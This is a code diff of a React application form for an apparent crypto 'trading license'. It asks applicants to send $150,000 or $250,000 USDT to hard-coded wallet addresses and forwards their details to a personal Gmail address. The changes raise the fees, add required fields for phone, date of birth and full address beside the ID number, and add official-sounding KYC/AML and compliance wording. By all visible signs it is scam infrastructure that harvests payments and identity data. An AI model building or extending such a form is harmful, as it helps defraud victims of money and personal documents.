@@ -27,7 +27,6 @@ const WALLET_ADDRESSES: WalletAddresses = {
   XRP: "0x7226A9A66E9e4f58fBcB67c9F1F7d52AFA9F8E2B"
 };
 
-// Administrator email for notifications
 const ADMIN_EMAIL = "catosabastian@gmail.com";
 
 interface ApplicationFormProps {
@@ -37,7 +36,7 @@ interface ApplicationFormProps {
 const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [applicantType, setApplicantType] = useState<'individual' | 'corporate'>('individual');
-  const [selectedCategory, setSelectedCategory] = useState<'1' | '2' | '3'>('1');
+  const [selectedCategory, setSelectedCategory] = useState<'4' | '5'>('4');
   const [selectedCrypto, setSelectedCrypto] = useState<'BTC' | 'ETH' | 'USDT_TRON' | 'USDT_ETH' | 'XRP'>('BTC');
   const [copySuccess, setCopySuccess] = useState<string | null>(null);
   
@@ -67,7 +66,6 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
     const formDataObj = Object.fromEntries(formData.entries());
     
     try {
-      // Prepare complete form data with additional information
       const completeFormData = {
         ...formDataObj,
         submissionTime: new Date().toISOString(),
@@ -76,7 +74,6 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
         selectedCrypto
       };
       
-      // First send the notification email to admin
       const notificationSent = await sendAdminNotification(
         completeFormData,
         ADMIN_EMAIL
@@ -97,10 +94,8 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
         description: "Your payment is being verified. License will be emailed shortly.",
       });
       
-      // Reset form
       (e.target as HTMLFormElement).reset();
       
-      // Close dialog if onClose is provided
       if (onClose) {
         setTimeout(onClose, 1500);
       }
@@ -186,6 +181,14 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                   <Input id="email" name="email" type="email" required />
                 </div>
                 <div className="space-y-2">
+                  <Label htmlFor="phone">Phone Number</Label>
+                  <Input id="phone" name="phone" type="tel" required />
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="dateOfBirth">Date of Birth</Label>
+                  <Input id="dateOfBirth" name="dateOfBirth" type="date" required />
+                </div>
+                <div className="space-y-2">
                   <Label htmlFor="country">Country of Residence</Label>
                   <Select name="country" defaultValue="US" required>
                     <SelectTrigger>
@@ -197,6 +200,9 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                       <SelectItem value="CA">Canada</SelectItem>
                       <SelectItem value="AU">Australia</SelectItem>
                       <SelectItem value="SG">Singapore</SelectItem>
+                      <SelectItem value="DE">Germany</SelectItem>
+                      <SelectItem value="FR">France</SelectItem>
+                      <SelectItem value="JP">Japan</SelectItem>
                       <SelectItem value="OTHER">Other</SelectItem>
                     </SelectContent>
                   </Select>
@@ -217,6 +223,10 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                 <div className="space-y-2 md:col-span-2">
                   <Label htmlFor="idNumber">ID Number</Label>
                   <Input id="idNumber" name="idNumber" required />
+                </div>
+                <div className="space-y-2 md:col-span-2">
+                  <Label htmlFor="address">Full Address</Label>
+                  <Textarea id="address" name="address" placeholder="Street address, city, state/province, postal code" required />
                 </div>
               </div>
             ) : (
@@ -263,7 +273,7 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
             
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div className="space-y-2">
-                <Label htmlFor="tradingPlatforms">Trading Platforms</Label>
+                <Label htmlFor="tradingPlatforms">Primary Trading Platform</Label>
                 <Select name="tradingPlatforms" defaultValue="binance" required>
                   <SelectTrigger>
                     <SelectValue placeholder="Select platform" />
@@ -273,42 +283,44 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                     <SelectItem value="kraken">Kraken</SelectItem>
                     <SelectItem value="coinbase">Coinbase</SelectItem>
                     <SelectItem value="kucoin">KuCoin</SelectItem>
+                    <SelectItem value="bybit">Bybit</SelectItem>
+                    <SelectItem value="okx">OKX</SelectItem>
                     <SelectItem value="multiple">Multiple Platforms</SelectItem>
                   </SelectContent>
                 </Select>
               </div>
               
               <div className="space-y-2">
-                <Label htmlFor="monthlyVolume">Monthly Trading Volume (USD)</Label>
-                <Select name="monthlyVolume" defaultValue="50k-250k" required>
+                <Label htmlFor="tradeVolume">Monthly Trade Volume (USD)</Label>
+                <Select name="tradeVolume" defaultValue="500k-1m" required>
                   <SelectTrigger>
                     <SelectValue placeholder="Select volume" />
                   </SelectTrigger>
                   <SelectContent>
-                    <SelectItem value="50k-250k">$50,000 - $250,000</SelectItem>
-                    <SelectItem value="250k-1m">$250,000 - $1,000,000</SelectItem>
-                    <SelectItem value="1m-10m">$1,000,000 - $10,000,000</SelectItem>
+                    <SelectItem value="500k-1m">$500,000 - $1,000,000</SelectItem>
+                    <SelectItem value="1m-5m">$1,000,000 - $5,000,000</SelectItem>
+                    <SelectItem value="5m-10m">$5,000,000 - $10,000,000</SelectItem>
                     <SelectItem value="10m+">More than $10,000,000</SelectItem>
                   </SelectContent>
                 </Select>
               </div>
               
-              <div className="space-y-2 md:col-span-2">
+              <div className="space-y-2">
                 <Label htmlFor="tradingExperience">Trading Experience (Years)</Label>
-                <Select name="tradingExperience" defaultValue="1-3" required>
+                <Select name="tradingExperience" defaultValue="3-5" required>
                   <SelectTrigger>
                     <SelectValue placeholder="Select experience" />
                   </SelectTrigger>
                   <SelectContent>
-                    <SelectItem value="<1">Less than 1 year</SelectItem>
                     <SelectItem value="1-3">1-3 years</SelectItem>
                     <SelectItem value="3-5">3-5 years</SelectItem>
-                    <SelectItem value="5+">More than 5 years</SelectItem>
+                    <SelectItem value="5-10">5-10 years</SelectItem>
+                    <SelectItem value="10+">More than 10 years</SelectItem>
                   </SelectContent>
                 </Select>
               </div>
               
-              <div className="space-y-2 md:col-span-2">
+              <div className="space-y-2">
                 <Label htmlFor="tradingStyle">Primary Trading Style</Label>
                 <Select name="tradingStyle" defaultValue="spot" required>
                   <SelectTrigger>
@@ -318,53 +330,55 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                     <SelectItem value="spot">Spot Trading</SelectItem>
                     <SelectItem value="margin">Margin Trading</SelectItem>
                     <SelectItem value="futures">Futures/Derivatives</SelectItem>
+                    <SelectItem value="arbitrage">Arbitrage</SelectItem>
                     <SelectItem value="mixed">Mixed Strategies</SelectItem>
                   </SelectContent>
                 </Select>
               </div>
+
+              <div className="space-y-2 md:col-span-2">
+                <Label htmlFor="tradingGoals">Trading Goals & Objectives</Label>
+                <Textarea 
+                  id="tradingGoals" 
+                  name="tradingGoals" 
+                  placeholder="Describe your trading goals, risk management strategy, and planned use of the license" 
+                  required 
+                />
+              </div>
             </div>
           </div>
           
-          {/* License Selection */}
+          {/* License Selection - Only Categories 4 & 5 */}
           <div className="space-y-4">
             <h3 className="text-lg font-semibold">License Selection</h3>
             
             <RadioGroup 
               name="licenseCategory" 
-              defaultValue="1" 
-              className="grid grid-cols-1 md:grid-cols-3 gap-4"
+              defaultValue="4" 
+              className="grid grid-cols-1 md:grid-cols-2 gap-4"
               required
-              onValueChange={(value) => setSelectedCategory(value as '1' | '2' | '3')}
+              onValueChange={(value) => setSelectedCategory(value as '4' | '5')}
             >
-              <div className={`border rounded-lg p-4 ${selectedCategory === '1' ? 'border-primary bg-primary/5' : ''}`}>
+              <div className={`border rounded-lg p-4 ${selectedCategory === '4' ? 'border-primary bg-primary/5' : ''}`}>
                 <div className="flex items-start gap-2">
-                  <RadioGroupItem value="1" id="category1" className="mt-1" />
+                  <RadioGroupItem value="4" id="category4" className="mt-1" />
                   <div>
-                    <Label htmlFor="category1" className="font-semibold">Category 1 - Individual Trader</Label>
-                    <p className="text-sm text-muted-foreground">$20,000 USD</p>
-                    <p className="text-xs text-muted-foreground mt-2">For monthly volumes of $50,000 minimum</p>
+                    <Label htmlFor="category4" className="font-semibold">Category 4 - Professional Trader</Label>
+                    <p className="text-sm text-muted-foreground">$150,000 USDT</p>
+                    <p className="text-xs text-muted-foreground mt-2">For trade volumes of $500,000+ minimum</p>
+                    <Badge variant="secondary" className="mt-2 bg-accent text-white">Recommended</Badge>
                   </div>
                 </div>
               </div>
               
-              <div className={`border rounded-lg p-4 ${selectedCategory === '2' ? 'border-primary bg-primary/5' : ''}`}>
+              <div className={`border rounded-lg p-4 ${selectedCategory === '5' ? 'border-primary bg-primary/5' : ''}`}>
                 <div className="flex items-start gap-2">
-                  <RadioGroupItem value="2" id="category2" className="mt-1" />
+                  <RadioGroupItem value="5" id="category5" className="mt-1" />
                   <div>
-                    <Label htmlFor="category2" className="font-semibold">Category 2 - Advanced Trader</Label>
-                    <p className="text-sm text-muted-foreground">$40,000 USD</p>
-                    <p className="text-xs text-muted-foreground mt-2">For monthly volumes of $250,000 minimum</p>
-                  </div>
-                </div>
-              </div>
-              
-              <div className={`border rounded-lg p-4 ${selectedCategory === '3' ? 'border-primary bg-primary/5' : ''}`}>
-                <div className="flex items-start gap-2">
-                  <RadioGroupItem value="3" id="category3" className="mt-1" />
-                  <div>
-                    <Label htmlFor="category3" className="font-semibold">Category 3 - Institutional</Label>
-                    <p className="text-sm text-muted-foreground">$70,000 USD</p>
-                    <p className="text-xs text-muted-foreground mt-2">For monthly volumes of $1,000,000+ minimum</p>
+                    <Label htmlFor="category5" className="font-semibold">Category 5 - Institutional Trader</Label>
+                    <p className="text-sm text-muted-foreground">$250,000 USDT</p>
+                    <p className="text-xs text-muted-foreground mt-2">For trade volumes of $1,000,000+ minimum</p>
+                    <Badge variant="outline" className="mt-2">Premium</Badge>
                   </div>
                 </div>
               </div>
@@ -404,7 +418,7 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                 </p>
                 
                 <div className="space-y-4">
-                  <div className="p-3 bg-white border rounded-md">
+                  <div className="p-3 bg-background border rounded-md">
                     <div className="flex items-center justify-between mb-1">
                       <Label className="text-xs text-muted-foreground">
                         {getCryptoLabel(selectedCrypto)} Wallet Address
@@ -446,10 +460,14 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
             </div>
           </div>
           
-          {/* Additional Comments */}
+          {/* Additional Information */}
           <div className="space-y-2">
             <Label htmlFor="additionalInfo">Additional Information (Optional)</Label>
-            <Textarea id="additionalInfo" name="additionalInfo" placeholder="Any additional information you would like to provide" />
+            <Textarea 
+              id="additionalInfo" 
+              name="additionalInfo" 
+              placeholder="Any additional information you would like to provide, including special requirements or questions"
+            />
           </div>
           
           {/* Agreements */}
@@ -460,7 +478,7 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                 htmlFor="termsAgreement"
                 className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
               >
-                I certify that all information provided is accurate and complete. I understand that providing false information may result in license revocation.
+                I certify that all information provided is accurate and complete. I understand that providing false information may result in license revocation and potential legal consequences.
               </label>
             </div>
             
@@ -470,7 +488,17 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
                 htmlFor="privacyAgreement"
                 className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
               >
-                I consent to the verification of my identity and trading history as part of the licensing process.
+                I consent to the verification of my identity and trading history as part of the licensing process, including KYC/AML procedures.
+              </label>
+            </div>
+
+            <div className="flex items-top space-x-2">
+              <Checkbox id="complianceAgreement" name="complianceAgreement" required />
+              <label
+                htmlFor="complianceAgreement"
+                className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
+              >
+                I agree to comply with all applicable regulations and maintain the licensing requirements throughout the validity period.
               </label>
             </div>
           </div>
@@ -490,7 +518,7 @@ const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
             {isSubmitting ? (
               <>
                 <Loader2 className="h-4 w-4 animate-spin" />
-                Processing...
+                Processing Application...
               </>
             ) : (
               <>
